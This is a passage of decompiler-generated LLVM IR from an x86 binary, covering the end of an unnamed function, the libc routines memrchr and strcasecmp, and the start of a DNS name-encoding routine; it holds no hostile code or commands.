dec_label_pc_805044c:                             ; preds = %dec_label_pc_80503e1, %dec_label_pc_805041e, %dec_label_pc_805044a
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_805044e = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_805044e, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050452

dec_label_pc_8050452:                             ; preds = %dec_label_pc_8050475, %dec_label_pc_805044c
  call void @__pseudo_call(i32 %tmp108)
  %v0_805046b = load i32, i32* %eax.global-to-local, align 4
  %v1_805046b = load i32, i32* %edi.global-to-local, align 4
  %v2_805046b = add i32 %v1_805046b, 4
  %v3_805046b = inttoptr i32 %v2_805046b to i32*
  %v4_805046b = load i32, i32* %v3_805046b, align 4
  %v15_805046b = icmp eq i32 %v0_805046b, %v4_805046b
  br i1 %v15_805046b, label %dec_label_pc_8050475, label %dec_label_pc_8050470

dec_label_pc_8050470:                             ; preds = %dec_label_pc_8050452
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805048e

dec_label_pc_8050475:                             ; preds = %dec_label_pc_8050452
  %v0_8050475 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050475 = add i32 %v0_8050475, %v0_805046b
  store i32 %v2_8050475, i32* %ebx.global-to-local, align 4
  %v1_8050477 = add i32 %v1_805046b, 12
  store i32 %v1_8050477, i32* %edi.global-to-local, align 4
  %v1_805047a = load i32, i32* %esi.global-to-local, align 4
  %v7_805047a = icmp ult i32 %v1_8050477, %v1_805047a
  %v1_805047c = icmp eq i1 %v7_805047a, false
  br i1 %v1_805047c, label %dec_label_pc_805048e, label %dec_label_pc_8050452

dec_label_pc_8050480:                             ; preds = %dec_label_pc_80501ed, %dec_label_pc_80501f6, %dec_label_pc_8050209
  %stack_var_-177.2 = phi i8 [ %stack_var_-186.0.v4_805012d, %dec_label_pc_8050209 ], [ 103, %dec_label_pc_80501f6 ], [ 103, %dec_label_pc_80501ed ]
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050224

dec_label_pc_805048e:                             ; preds = %dec_label_pc_8050475, %dec_label_pc_8050470
  %v0_805048e = phi i32 [ -1, %dec_label_pc_8050470 ], [ %v2_8050475, %dec_label_pc_8050475 ]
  store i32 %v0_805048e, i32* %eax.global-to-local, align 4
  %v2_8050497 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050497, i32* @esi, align 4
  store i32 %v0_804fed6, i32* @edi, align 4
  store i32 %v0_804fed5, i32* @ebp, align 4
  ret i32 %v0_805048e

; uselistorder directives
  uselistorder i32 %v0_805048e, { 1, 0 }
  uselistorder i32 %v2_8050409, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80503f3, { 1, 0 }
  uselistorder i32 %v1_80503da, { 1, 2, 0 }
  uselistorder i32 %v0_805044a, { 1, 2, 3, 0 }
  uselistorder i32 %v9_805039f, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805039c, { 1, 0 }
  uselistorder i32 %v0_805036c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8050341, { 1, 0 }
  uselistorder i32 %stack_var_-208.0, { 1, 0 }
  uselistorder i32 %v2_805026f, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8050259, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8050248, { 1, 3, 0, 2, 4, 5 }
  uselistorder i32 %v1_80502bc, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_805021a, { 0, 2, 1 }
  uselistorder i32 %v1_80501f6, { 1, 0 }
  uselistorder i32 %v0_80501ed, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80501c1, { 1, 0 }
  uselistorder i32 %v2_80501ba, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_80501b0, { 1, 0 }
  uselistorder i32 %v0_8050139, { 1, 2, 0 }
  uselistorder i8 %stack_var_-186.0.v4_805012d, { 2, 1, 4, 0, 5, 3 }
  uselistorder i8 %.141, { 1, 0 }
  uselistorder i32 %v0_8050111, { 1, 0 }
  uselistorder i32 %v1_8050109, { 1, 0 }
  uselistorder i32 %v0_80500ff, { 1, 0 }
  uselistorder i32 %v5_80500e9, { 1, 0 }
  uselistorder i32 %tmp150, { 3, 2, 1, 0 }
  uselistorder x86_fp80 %v2_80500e1, { 1, 0 }
  uselistorder i32 %v3_804ff33, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_804ff0d, { 1, 0 }
  uselistorder i32 %v3_804feec, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 1, 0, 2 }
  uselistorder i32* %stack_var_-67, { 2, 1, 0 }
  uselistorder i32* %stack_var_-128, { 2, 0, 1 }
  uselistorder i32* %stack_var_-23, { 1, 0 }
  uselistorder i32* %stack_var_-148, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-22, { 4, 0, 1, 2, 3 }
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i32 %tmp108, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12, 13, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 7, 5, 4, 8, 9, 10, 11, 12, 13, 29, 14, 15, 30, 17, 18, 16, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28 }
  uselistorder i32* %edi.global-to-local, { 2, 3, 4, 5, 0, 1, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 10, 9, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 37, 38, 39, 4, 11, 12, 13, 14, 5, 15, 16, 17, 6, 18, 19, 20, 7, 21, 22, 23, 8, 24, 25, 26, 9, 10, 27, 28, 31, 29, 32, 30, 33, 34, 35, 36, 40 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 6, 7, 8, 2, 9, 5, 3, 10, 4, 11 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 4, 5, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i8 8, { 3, 0, 4, 2, 5, 6, 7, 8, 1 }
  uselistorder i32 160, { 1, 0 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i32 45, { 2, 4, 0, 3, 1 }
  uselistorder i32 176, { 1, 2, 0 }
  uselistorder i32 112, { 2, 3, 4, 0, 1 }
  uselistorder i8 58, { 0, 5, 6, 7, 1, 2, 3, 4 }
  uselistorder i8 48, { 11, 14, 2, 3, 6, 5, 4, 7, 12, 8, 9, 0, 10, 1, 13 }
  uselistorder i32* @esp, { 25, 26, 27, 28, 6, 29, 30, 31, 32, 7, 33, 34, 35, 36, 37, 38, 39, 40, 10, 41, 11, 42, 43, 44, 45, 9, 46, 47, 48, 49, 50, 51, 52, 14, 53, 54, 15, 55, 56, 12, 57, 58, 13, 59, 60, 16, 61, 62, 63, 64, 65, 8, 66, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 128, 17, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 19, 140, 162, 141, 142, 143, 144, 145, 20, 146, 18, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 0, 161, 3, 163, 164, 166, 165, 4, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 21, 191, 192, 193, 194, 195, 196, 197, 198, 199, 67, 1, 68, 69, 2, 70, 71, 72, 73, 74, 75, 207, 208, 209, 210, 211, 212, 5, 213, 214, 215, 216, 217, 218, 22, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 97, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 23, 89, 90, 91, 92, 93, 94, 95, 96, 24, 200, 201, 202, 203, 204, 205, 206 }
  uselistorder i1* @df, { 5, 6, 7, 9, 10, 11, 0, 12, 18, 19, 20, 1, 13, 21, 23, 25, 24, 2, 22, 8, 3, 4, 14, 15, 16, 17 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i8 32, { 6, 0, 7, 8, 9, 10, 11, 14, 13, 15, 16, 17, 12, 1, 4, 2, 5, 3 }
  uselistorder i32 48, { 3, 8, 2, 5, 14, 23, 15, 16, 9, 10, 17, 18, 19, 0, 26, 27, 28, 6, 7, 1, 20, 24, 25, 21, 22, 4, 29, 30, 31, 11, 13, 12 }
  uselistorder i32 10, { 23, 11, 10, 17, 0, 27, 18, 1, 28, 29, 24, 2, 32, 15, 33, 34, 35, 36, 22, 3, 25, 26, 4, 8, 30, 37, 16, 38, 39, 19, 13, 5, 9, 6, 42, 21, 31, 12, 43, 20, 40, 41, 14, 7 }
  uselistorder i32 9, { 8, 9, 15, 16, 17, 10, 11, 12, 13, 18, 5, 19, 1, 2, 14, 3, 7, 6, 4, 0 }
  uselistorder i16 256, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder i32 68, { 0, 5, 6, 15, 12, 13, 14, 3, 1, 16, 2, 7, 8, 11, 9, 10, 4 }
  uselistorder i32 12, { 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 56, 57, 58, 8, 25, 0, 1, 26, 27, 28, 29, 5, 30, 31, 32, 33, 34, 2, 35, 36, 61, 6, 9, 10, 62, 63, 64, 7, 65, 66, 67, 68, 11, 69, 37, 76, 77, 41, 42, 43, 44, 38, 59, 60, 39, 40, 78, 79, 80, 81, 82, 83, 84, 85, 86, 70, 71, 87, 88, 89, 90, 91, 92, 45, 46, 47, 48, 49, 13, 50, 73, 72, 51, 52, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 12, 124, 53, 54, 3, 55, 74, 4, 75 }
  uselistorder i32 6, { 14, 15, 17, 18, 2, 3, 6, 16, 4, 0, 5, 9, 7, 8, 10, 13, 11, 12, 19, 1 }
  uselistorder i32 32, { 33, 26, 16, 48, 49, 50, 34, 35, 36, 17, 19, 37, 38, 39, 40, 41, 0, 42, 54, 55, 56, 27, 57, 58, 59, 60, 43, 44, 51, 52, 45, 46, 65, 66, 67, 68, 69, 70, 71, 72, 73, 28, 20, 32, 53, 18, 31, 2, 1, 4, 3, 29, 5, 47, 7, 6, 9, 8, 11, 10, 13, 12, 22, 24, 15, 14, 23, 61, 62, 63, 64, 25, 21, 30 }
  uselistorder i32* @ecx, { 15, 16, 17, 19, 20, 14, 18, 31, 63, 32, 33, 34, 35, 36, 37, 38, 11, 39, 42, 41, 2, 6, 40, 3, 7, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 21, 23, 22, 53, 5, 54, 55, 56, 57, 58, 59, 64, 65, 66, 67, 29, 30, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 4, 26, 0, 1, 27, 28, 12, 79, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 97, 146, 61, 147, 8, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 9, 117, 98, 99, 100, 101, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 10, 138, 141, 139, 140, 142, 143, 144, 145, 13, 96, 91, 148, 68, 149, 62, 24, 25, 60 }
  uselistorder label %dec_label_pc_8050480, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805044c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805044a, { 1, 0 }
  uselistorder label %dec_label_pc_80503d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050396.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8050382, { 1, 0 }
  uselistorder label %dec_label_pc_805035a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805032f, { 1, 0 }
  uselistorder label %dec_label_pc_8050318, { 1, 0 }
  uselistorder label %dec_label_pc_80502fe, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80502c5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80502ae, { 1, 0 }
  uselistorder label %dec_label_pc_80502a3, { 1, 0 }
  uselistorder label %dec_label_pc_8050224, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80501db, { 1, 0 }
  uselistorder label %dec_label_pc_80501a9.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8050195, { 1, 0 }
  uselistorder label %dec_label_pc_8050147, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ff50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ff24, { 1, 0 }
  uselistorder label %dec_label_pc_804ff1b, { 1, 0 }
}

define i32 @memrchr(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %v4_80504ad = sext i8 %arg1 to i32
  %v2_80504b1 = add i32 %tmp34, %v4_80504ad
  %v1_80504c37 = icmp eq i32 %tmp34, 0
  %.pre = urem i32 %arg2, 256
  br i1 %v1_80504c37, label %dec_label_pc_80504cb, label %dec_label_pc_80504c7

dec_label_pc_80504b5:                             ; preds = %dec_label_pc_80504c7
  %v1_80504b5 = add i32 %v0_80504b5, -1
  %v5_80504b6 = load i32, i32* @edx, align 4
  %v6_80504b6 = and i32 %v5_80504b6, -256
  %v7_80504b6 = or i32 %v6_80504b6, %.pre
  store i32 %v7_80504b6, i32* @edx, align 4
  %v1_80504ba = inttoptr i32 %v1_80504b5 to i8*
  %v2_80504ba = load i8, i8* %v1_80504ba, align 1
  %v15_80504ba = icmp eq i8 %v2_80504ba, %tmp
  br i1 %v15_80504ba, label %dec_label_pc_8050549, label %dec_label_pc_80504c2

dec_label_pc_80504c2:                             ; preds = %dec_label_pc_80504b5
  %v1_80504c2 = add i32 %v0_80504c2, -1
  %v8_80504c2 = icmp eq i32 %v1_80504c2, 0
  br i1 %v8_80504c2, label %dec_label_pc_80504cb, label %dec_label_pc_80504c7

dec_label_pc_80504c7:                             ; preds = %entry, %dec_label_pc_80504c2
  %v0_80504c2 = phi i32 [ %v1_80504c2, %dec_label_pc_80504c2 ], [ %tmp34, %entry ]
  %v0_80504b5 = phi i32 [ %v1_80504b5, %dec_label_pc_80504c2 ], [ %v2_80504b1, %entry ]
  %v2_80504c7 = urem i32 %v0_80504b5, 4
  %v3_80504c7 = icmp eq i32 %v2_80504c7, 0
  %v1_80504c9 = icmp eq i1 %v3_80504c7, false
  br i1 %v1_80504c9, label %dec_label_pc_80504b5, label %dec_label_pc_80504cb

dec_label_pc_80504cb:                             ; preds = %dec_label_pc_80504c2, %dec_label_pc_80504c7, %entry
  %v0_805052f.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_80504c2 ], [ %v0_80504c2, %dec_label_pc_80504c7 ]
  %v0_80504cb = phi i32 [ %v2_80504b1, %entry ], [ %v1_80504b5, %dec_label_pc_80504c2 ], [ %v0_80504b5, %dec_label_pc_80504c7 ]
  %v2_80504d4 = mul nuw nsw i32 %.pre, 256
  %v2_80504d7 = or i32 %v2_80504d4, %.pre
  %v2_80504db = mul i32 %v2_80504d7, 65536
  %v2_80504de = or i32 %v2_80504db, %v2_80504d7
  %v6_805053249 = icmp ugt i32 %v0_805052f.pr, 3
  br i1 %v6_805053249, label %dec_label_pc_80504e2, label %dec_label_pc_8050534

dec_label_pc_80504e2:                             ; preds = %dec_label_pc_80504cb, %dec_label_pc_805052c
  %v0_805052c51 = phi i32 [ %v1_805052c, %dec_label_pc_805052c ], [ %v0_805052f.pr, %dec_label_pc_80504cb ]
  %v0_80504e250 = phi i32 [ %v1_80504e2, %dec_label_pc_805052c ], [ %v0_80504cb, %dec_label_pc_80504cb ]
  %v1_80504e2 = add i32 %v0_80504e250, -4
  %v2_80504e7 = inttoptr i32 %v1_80504e2 to i32*
  %v3_80504e7 = load i32, i32* %v2_80504e7, align 4
  %v4_80504e7 = xor i32 %v3_80504e7, %v2_80504de
  %v1_80504eb = xor i32 %v4_80504e7, -2130640640
  %v1_80504ed = add i32 %v4_80504e7, 2130640639
  %v2_80504f2 = xor i32 %v1_80504eb, %v1_80504ed
  %v1_80504f4 = and i32 %v2_80504f2, -2130640640
  %v2_80504f4 = icmp eq i32 %v1_80504f4, 0
  br i1 %v2_80504f4, label %dec_label_pc_805052c, label %dec_label_pc_80504fc

dec_label_pc_80504fc:                             ; preds = %dec_label_pc_80504e2
  %v1_80504fc = add i32 %v0_80504e250, -1
  %v7_80504ff = or i32 %v1_80504f4, %.pre
  %v2_8050503 = inttoptr i32 %v1_80504fc to i8*
  %v3_8050503 = load i8, i8* %v2_8050503, align 1
  %v16_8050503 = icmp eq i8 %v3_8050503, %tmp
  br i1 %v16_8050503, label %dec_label_pc_8050549, label %dec_label_pc_8050508

dec_label_pc_8050508:                             ; preds = %dec_label_pc_80504fc
  %v1_8050508 = add i32 %v0_80504e250, -2
  %v2_805050f = inttoptr i32 %v1_8050508 to i8*
  %v3_805050f = load i8, i8* %v2_805050f, align 1
  %v16_805050f = icmp eq i8 %v3_805050f, %tmp
  br i1 %v16_805050f, label %dec_label_pc_8050549, label %dec_label_pc_8050514

dec_label_pc_8050514:                             ; preds = %dec_label_pc_8050508
  %v1_8050514 = add i32 %v0_80504e250, -3
  %v2_805051b = inttoptr i32 %v1_8050514 to i8*
  %v3_805051b = load i8, i8* %v2_805051b, align 1
  %v16_805051b = icmp eq i8 %v3_805051b, %tmp
  br i1 %v16_805051b, label %dec_label_pc_8050549, label %dec_label_pc_8050520

dec_label_pc_8050520:                             ; preds = %dec_label_pc_8050514
  %v1_8050524 = inttoptr i32 %v1_80504e2 to i8*
  %v2_8050524 = load i8, i8* %v1_8050524, align 1
  %v15_8050524 = icmp eq i8 %v2_8050524, %tmp
  %v1_8050526 = icmp eq i1 %v15_8050524, false
  br i1 %v1_8050526, label %dec_label_pc_805052c, label %dec_label_pc_8050528

dec_label_pc_8050528:                             ; preds = %dec_label_pc_8050520
  br label %dec_label_pc_8050549

dec_label_pc_805052c:                             ; preds = %dec_label_pc_8050520, %dec_label_pc_80504e2
  %v5_805053927 = phi i32 [ %v7_80504ff, %dec_label_pc_8050520 ], [ 0, %dec_label_pc_80504e2 ]
  %v1_805052c = add i32 %v0_805052c51, -4
  %v6_8050532 = icmp ugt i32 %v1_805052c, 3
  br i1 %v6_8050532, label %dec_label_pc_80504e2, label %dec_label_pc_8050534

dec_label_pc_8050534:                             ; preds = %dec_label_pc_805052c, %dec_label_pc_80504cb
  %v5_805053926.lcssa = phi i32 [ %.pre, %dec_label_pc_80504cb ], [ %v5_805053927, %dec_label_pc_805052c ]
  %v0_80504e2.lcssa = phi i32 [ %v0_80504cb, %dec_label_pc_80504cb ], [ %v1_80504e2, %dec_label_pc_805052c ]
  %v0_805052c.lcssa = phi i32 [ %v0_805052f.pr, %dec_label_pc_80504cb ], [ %v1_805052c, %dec_label_pc_805052c ]
  br label %dec_label_pc_8050541

dec_label_pc_8050538:                             ; preds = %dec_label_pc_8050541
  %v1_8050541 = add i32 %v0_8050541, -1
  %v1_8050538 = add i32 %v0_8050538, -1
  %v6_8050539 = and i32 %v5_8050539, -256
  %v7_8050539 = or i32 %v6_8050539, %.pre
  %v1_805053d = inttoptr i32 %v1_8050538 to i8*
  %v2_805053d = load i8, i8* %v1_805053d, align 1
  %v15_805053d = icmp eq i8 %v2_805053d, %tmp
  br i1 %v15_805053d, label %dec_label_pc_8050549, label %dec_label_pc_8050541

dec_label_pc_8050541:                             ; preds = %dec_label_pc_8050538, %dec_label_pc_8050534
  %v5_8050539 = phi i32 [ %v7_8050539, %dec_label_pc_8050538 ], [ %v5_805053926.lcssa, %dec_label_pc_8050534 ]
  %v0_8050538 = phi i32 [ %v1_8050538, %dec_label_pc_8050538 ], [ %v0_80504e2.lcssa, %dec_label_pc_8050534 ]
  %v0_8050541 = phi i32 [ %v1_8050541, %dec_label_pc_8050538 ], [ %v0_805052c.lcssa, %dec_label_pc_8050534 ]
  %v10_8050542 = icmp eq i32 %v0_8050541, 0
  %v1_8050545 = icmp eq i1 %v10_8050542, false
  br i1 %v1_8050545, label %dec_label_pc_8050538, label %dec_label_pc_8050547

dec_label_pc_8050547:                             ; preds = %dec_label_pc_8050541
  br label %dec_label_pc_8050549

dec_label_pc_8050549:                             ; preds = %dec_label_pc_80504b5, %dec_label_pc_8050514, %dec_label_pc_8050508, %dec_label_pc_80504fc, %dec_label_pc_8050538, %dec_label_pc_8050528, %dec_label_pc_8050547
  %v0_805054c = phi i32 [ %v1_80504e2, %dec_label_pc_8050528 ], [ 0, %dec_label_pc_8050547 ], [ %v1_8050538, %dec_label_pc_8050538 ], [ %v1_8050514, %dec_label_pc_8050514 ], [ %v1_8050508, %dec_label_pc_8050508 ], [ %v1_80504fc, %dec_label_pc_80504fc ], [ %v1_80504b5, %dec_label_pc_80504b5 ]
  ret i32 %v0_805054c

; uselistorder directives
  uselistorder i32 %v0_8050541, { 1, 0 }
  uselistorder i32 %v1_805052c, { 0, 2, 1 }
  uselistorder i32 %v1_80504e2, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v0_80504e250, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80504d7, { 1, 0 }
  uselistorder i32 %v0_80504b5, { 1, 0, 2 }
  uselistorder i32 %.pre, { 4, 5, 3, 2, 0, 1 }
  uselistorder i32 %v2_80504b1, { 1, 0 }
  uselistorder i32 %tmp34, { 0, 2, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4 }
  uselistorder i32 -2, { 4, 12, 3, 13, 8, 7, 9, 10, 15, 16, 17, 1, 14, 18, 19, 2, 6, 5, 0, 11 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 47, 6, 48, 7, 49, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 54, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 52, 36, 35, 50, 51, 37, 38, 53, 39, 40, 0, 41, 42, 43, 44, 45, 46 }
  uselistorder label %dec_label_pc_8050549, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80504e2, { 1, 0 }
  uselistorder label %dec_label_pc_80504cb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80504c7, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8050552 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_805055c

dec_label_pc_805055c:                             ; preds = %dec_label_pc_805057f, %entry
  %v0_80505854 = phi i32 [ %v0_80505855, %dec_label_pc_805057f ], [ 0, %entry ]
  %v0_805057f = phi i32 [ %v1_805057f, %dec_label_pc_805057f ], [ %arg2, %entry ]
  %v0_8050580 = phi i32 [ %v1_8050580, %dec_label_pc_805057f ], [ %v4_8050552, %entry ]
  %v12_805055c = icmp eq i32 %v0_8050580, %v0_805057f
  br i1 %v12_805055c, label %dec_label_pc_805055c.dec_label_pc_805057a_crit_edge, label %dec_label_pc_8050560

dec_label_pc_805055c.dec_label_pc_805057a_crit_edge: ; preds = %dec_label_pc_805055c
  %.pre = inttoptr i32 %v0_805057f to i8*
  br label %dec_label_pc_805057a

dec_label_pc_8050560:                             ; preds = %dec_label_pc_805055c
  %v0_8050560 = load i32, i32* bitcast (i32** @global_var_8053590.150 to i32*), align 16
  %v1_8050566 = inttoptr i32 %v0_8050580 to i8*
  %v2_8050566 = load i8, i8* %v1_8050566, align 1
  %v3_8050566 = zext i8 %v2_8050566 to i32
  %v2_8050569 = mul nuw nsw i32 %v3_8050566, 2
  %v3_8050569 = add i32 %v2_8050569, %v0_8050560
  %v4_8050569 = inttoptr i32 %v3_8050569 to i16*
  %v5_8050569 = load i16, i16* %v4_8050569, align 2
  %v6_8050569 = sext i16 %v5_8050569 to i32
  %v1_805056d = inttoptr i32 %v0_805057f to i8*
  %v2_805056d = load i8, i8* %v1_805056d, align 1
  %v3_805056d = zext i8 %v2_805056d to i32
  %v2_8050570 = mul nuw nsw i32 %v3_805056d, 2
  %v3_8050570 = add i32 %v2_8050570, %v0_8050560
  %v4_8050570 = inttoptr i32 %v3_8050570 to i16*
  %v5_8050570 = load i16, i16* %v4_8050570, align 2
  %v6_8050570 = sext i16 %v5_8050570 to i32
  %v2_8050574 = sub nsw i32 %v6_8050569, %v6_8050570
  %v12_8050574 = icmp eq i32 %v2_8050574, 0
  %v1_8050578 = icmp eq i1 %v12_8050574, false
  br i1 %v1_8050578, label %dec_label_pc_8050583, label %dec_label_pc_805057a

dec_label_pc_805057a:                             ; preds = %dec_label_pc_805055c.dec_label_pc_805057a_crit_edge, %dec_label_pc_8050560
  %v1_805057a.pre-phi = phi i8* [ %.pre, %dec_label_pc_805055c.dec_label_pc_805057a_crit_edge ], [ %v1_8050566, %dec_label_pc_8050560 ]
  %v0_80505855 = phi i32 [ %v0_80505854, %dec_label_pc_805055c.dec_label_pc_805057a_crit_edge ], [ %v2_8050574, %dec_label_pc_8050560 ]
  %v2_805057a = load i8, i8* %v1_805057a.pre-phi, align 1
  %v3_805057a = icmp eq i8 %v2_805057a, 0
  br i1 %v3_805057a, label %dec_label_pc_8050583, label %dec_label_pc_805057f

dec_label_pc_805057f:                             ; preds = %dec_label_pc_805057a
  %v1_805057f = add i32 %v0_805057f, 1
  %v1_8050580 = add i32 %v0_8050580, 1
  br label %dec_label_pc_805055c

dec_label_pc_8050583:                             ; preds = %dec_label_pc_805057a, %dec_label_pc_8050560
  %v0_8050585 = phi i32 [ %v0_80505855, %dec_label_pc_805057a ], [ %v2_8050574, %dec_label_pc_8050560 ]
  ret i32 %v0_8050585

; uselistorder directives
  uselistorder i32 %v0_80505855, { 1, 0 }
  uselistorder i32 %v2_8050574, { 1, 0, 2 }
  uselistorder i32 %v0_8050580, { 1, 2, 0 }
  uselistorder i32 %v0_805057f, { 2, 3, 0, 1 }
  uselistorder i32 65536, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9, 10, 11, 12, 17, 13, 14, 15, 21, 18, 22, 16, 19, 20 }
  uselistorder label %dec_label_pc_805057a, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050589 = load i32, i32* @edi, align 4
  %v0_805058a = load i32, i32* @esi, align 4
  %v0_805058b = load i32, i32* @ebx, align 4
  store i32 %v0_805058b, i32* %stack_var_-16, align 4
  %v4_805058c = ptrtoint i8* %arg1 to i32
  store i32 %v4_805058c, i32* @edi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80505e56 = icmp eq i8* %arg1, null
  br i1 %v1_80505e56, label %dec_label_pc_80505ee, label %dec_label_pc_80505e9.lr.ph

dec_label_pc_80505e9.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80505e9

dec_label_pc_8050594:                             ; preds = %dec_label_pc_80505e9
  %v5_8050597 = call i32 @__GI_strchr(i8* %v1_80505e9, i32 46)
  %v1_80505a0 = icmp eq i32 %v5_8050597, 0
  br i1 %v1_80505a0, label %dec_label_pc_80505aa, label %dec_label_pc_80505a4

dec_label_pc_80505a4:                             ; preds = %dec_label_pc_8050594
  %v1_80505a6 = load i32, i32* @edi, align 4
  %v2_80505a6 = sub i32 %v5_8050597, %v1_80505a6
  br label %dec_label_pc_80505b3

dec_label_pc_80505aa:                             ; preds = %dec_label_pc_8050594
  %v0_80505aa = load i32, i32* @edi, align 4
  %v5_80505aa = inttoptr i32 %v0_80505aa to i8*
  %v3_80505ab = call i32 @strlen(i8* %v5_80505aa)
  store i32 %v0_80505aa, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80505b3

dec_label_pc_80505b3:                             ; preds = %dec_label_pc_80505a4, %dec_label_pc_80505aa
  %v0_80505c2 = phi i32 [ %v2_80505a6, %dec_label_pc_80505a4 ], [ %v3_80505ab, %dec_label_pc_80505aa ]
  store i32 %v0_80505c2, i32* @esi, align 4
  %v1_80505b3 = icmp eq i32 %v0_80505c2, 0
  %v3_80505b3 = trunc i32 %v0_80505c2 to i8
  br i1 %v1_80505b3, label %dec_label_pc_8050602, label %dec_label_pc_80505b7

dec_label_pc_80505b7:                             ; preds = %dec_label_pc_80505b3
  %v1_80505bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80505bb = sub i32 %arg3, %v1_80505bb
  %v1_80505bd = add i32 %v2_80505bb, -1
  %v7_80505be = icmp ult i32 %v0_80505c2, %v1_80505bd
  %v1_80505c0 = icmp eq i1 %v7_80505be, false
  br i1 %v1_80505c0, label %dec_label_pc_8050602, label %dec_label_pc_80505c2

